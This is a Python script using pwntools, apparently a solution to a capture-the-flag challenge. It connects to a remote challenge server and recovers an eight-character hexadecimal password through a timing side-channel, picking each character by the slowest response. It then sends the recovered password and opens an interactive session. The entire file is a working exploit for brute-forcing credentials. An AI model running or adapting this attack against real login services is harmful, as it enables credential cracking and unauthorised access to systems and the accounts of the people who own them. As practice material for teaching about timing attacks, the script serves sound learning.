```python
#!/usr/bin/env python3
from pwn import *
import time

HOST = "challenge.ctf.games"
PORT = 30689
PASSWORD_LEN = 8
CHARS = '0123456789abcdef'

def get_response_time(conn, guess):
    start_time = time.time()
    
    conn.sendline(guess)
    
    conn.recvline()
    
    elapsed_time = time.time() - start_time
    return elapsed_time

def crack_password(conn):
    password = ""
    
    for i in range(PASSWORD_LEN):
        best_time = 0
        best_char = ""
        
        for char in CHARS:
            guess = password + char + "0" * (PASSWORD_LEN - len(password) - 1)
            elapsed_time = get_response_time(conn, guess)
            print(f"Trying {guess}: {elapsed_time:.4f}s")
            
            if elapsed_time > best_time:
                best_time = elapsed_time
                best_char = char
        
        password += best_char
        print(f"Found character {i+1}: {best_char}")
    
    return password

def main():
    conn = remote(HOST, PORT)
    
    conn.recvuntil(b": ")
    
    password = crack_password(conn)
    print(f"Cracked password: {password}")
    
    conn.sendline(password.encode())
    
    conn.interactive()

if __name__ == "__main__":
    main()
```